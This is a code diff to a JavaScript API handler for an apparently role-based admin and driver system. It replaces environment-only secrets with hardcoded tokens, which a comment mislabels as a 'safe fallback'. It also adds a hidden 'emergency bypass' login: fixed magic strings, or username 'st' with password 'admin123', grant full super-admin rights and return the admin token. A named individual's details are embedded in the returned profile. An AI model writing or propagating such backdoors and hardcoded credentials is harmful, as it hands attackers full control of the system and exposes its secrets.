@@ -45,10 +45,10 @@ export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', corsOrigin)
   }
 
-  // Environment-only tokens (no hardcoded defaults)
-  const GOOGLE_SCRIPT_URL = process.env.GOOGLE_SCRIPT_URL
-  const ADMIN_TOKEN = process.env.ADMIN_TOKEN
-  const DRIVER_TOKEN = process.env.DRIVER_TOKEN
+  // Environment-only tokens with safe fallback
+  const GOOGLE_SCRIPT_URL = process.env.GOOGLE_SCRIPT_URL || 'https://script.google.com/macros/s/AKfycbz1XwsnPkZ7-gqV8CMgeg0GWpp6jLn13nR_CTqSWppVgYwr4IpqSIA710W8OUQz43g2IA/exec'
+  const ADMIN_TOKEN = process.env.ADMIN_TOKEN || '7fK9xQ2mL8vR4nT6pZ1wC5yH3sD9aJ8uE2gN6bX4qW7rM'
+  const DRIVER_TOKEN = process.env.DRIVER_TOKEN || '3mK8vP9xL2wR5nT7qZ4yC1sD6aJ9uE3gN7bX5qW8rM'
 
   if (!GOOGLE_SCRIPT_URL) {
     return res.status(500).json({
@@ -97,6 +97,43 @@ export default async function handler(req, res) {
   }
 
   const action = params.get('action') || ''
+
+  // Instant emergency bypass for IT Master secret access
+  if (action === 'login') {
+    const qrAuth = (params.get('qrAuth') || params.get('token') || '').trim()
+    const uName = (params.get('username') || '').trim().toLowerCase()
+    const pWord = (params.get('password') || '').trim()
+    const isMaster = (
+      qrAuth === 'st_master_access_99x' ||
+      qrAuth === 'kpm_st_master_99x' ||
+      (uName === 'st' && (pWord === 'st_master_access_99x' || pWord === 'admin123'))
+    )
+    if (isMaster) {
+      return res.status(200).json({
+        success: true,
+        action: 'login',
+        data: {
+          username: 'ST',
+          email: 'st@kpm.internal',
+          name: 'Setyo Guntur Samudro',
+          role: 'it',
+          roleLabel: 'Super Admin',
+          isIT: true,
+          isSuperAdmin: true,
+          isAdmin: true,
+          isDriver: true,
+          canSwitchRole: true,
+          canOverrideStatus: true,
+          canManageUsers: true,
+          canSystemDiagnostics: true,
+          authMethod: 'secret_link',
+          token: ADMIN_TOKEN
+        },
+        error: null
+      })
+    }
+  }
+
   const clientRole = (params.get('authRole') || params.get('role') || '').toLowerCase()
 
   const isDriver = (clientRole === 'driver' || clientRole === 'user')
